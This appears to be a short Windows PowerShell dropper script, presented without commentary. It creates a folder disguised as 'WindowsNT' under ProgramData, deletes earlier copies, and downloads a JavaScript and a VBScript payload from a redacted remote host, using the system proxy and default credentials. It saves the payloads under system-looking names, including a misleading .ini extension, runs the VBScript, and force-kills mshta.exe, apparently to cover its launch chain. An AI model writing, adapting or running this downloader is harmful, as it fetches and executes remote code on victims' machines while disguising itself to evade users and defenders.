mkdir "c:\ProgramData\WindowsNT\"
attrib -s -h "c:\ProgramData\WindowsNT\WindowsNT.ini"
attrib -s -h "c:\ProgramData\WindowsNT\WindowsNT.vbs"
del "c:\ProgramData\WindowsNT\WindowsNT.vbs"
del "c:\ProgramData\WindowsNT\WindowsNT.ini"

$V=new-object net.webclient;
$V.proxy=[Net.WebRequest]::GetSystemWebProxy();
$V.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;
$V.DownloadFile('http://xxx/xxx/co.js','c:\ProgramData\WindowsNT\WindowsNT.ini');
$V.DownloadFile('http://xxx/xxx/co.vbs','c:\ProgramData\WindowsNT\WindowsNT.vbs');


while($true){
    if((@(dir "c:\ProgramData\WindowsNT\WindowsNT.*")).Length -eq 2) {
        wscript c:\ProgramData\WindowsNT\WindowsNT.vbs
        taskkill /F /IM mshta.exe
        ps -name mshta.exe -ErrorAction SilentlyContinue | kill -Force
        break;
    }
}